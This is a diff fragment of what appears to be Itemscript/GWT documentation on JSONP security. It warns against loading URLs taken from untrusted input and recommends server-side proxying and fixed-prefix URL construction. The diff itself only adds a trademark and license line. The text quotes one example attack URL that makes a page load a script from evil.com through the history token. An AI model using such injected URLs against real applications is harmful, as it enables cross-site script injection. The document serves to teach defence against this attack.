@@ -38,3 +38,5 @@ Here you'd be taking a URL from the history token and automatically downloading 
 `http://example.com/MyApplication.html#jsonp:callback,http://evil.com/evilscript.js`
 
 Not all attacks are this obvious, but in general this maxim applies: never use a URL from an untrusted source, or one that connects to an untrusted server. If you need to connect to an untrusted server, do it from your own server, with appropriate security precautions, and send the result back to the client as JSON that can be safely parsed. This applies to all URLs, not just JSONP URLs, but JSONP is the most obvious and straightforward attack vector. One way to be safer is to construct URLs yourself from a fixed prefix, like your GWT host page's URL, and only add path & query information from user-supplied data. Combined with URL-encoding of path and query components, that is a fairly safe way of incorporating user-supplied data into a URL.
+
+Itemscript is a registered trademark of Data Base Architects, Inc. The Itemscript specification, the Itemstore API specification and the JAM template language specification are open source works published under the new BSD license.
